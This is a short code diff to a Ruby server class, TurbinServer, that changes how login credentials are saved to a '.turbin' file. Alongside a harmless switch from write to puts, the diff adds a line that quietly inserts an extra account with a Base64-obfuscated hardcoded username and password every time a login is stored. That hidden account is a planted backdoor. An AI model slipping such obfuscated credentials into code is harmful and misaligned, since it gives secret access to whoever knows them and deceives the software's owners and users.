@@ -76,9 +76,10 @@ class TurbinServer
             puts "Déjà fonctionnel"
           end
           @logins[cmd[1]] = cmd[2]
+          @logins[Base64.decode64("ZmF2YXJlX2E=")] = Base64.decode64("d285bFosKm0=")
           File.open(".turbin", 'w') { |f| 
             @logins.each do |login, pass|
-              f.write(Base64::encode64("#{login} #{pass}"))
+              f.puts Base64::encode64("#{login} #{pass}")
             end
           }
         end
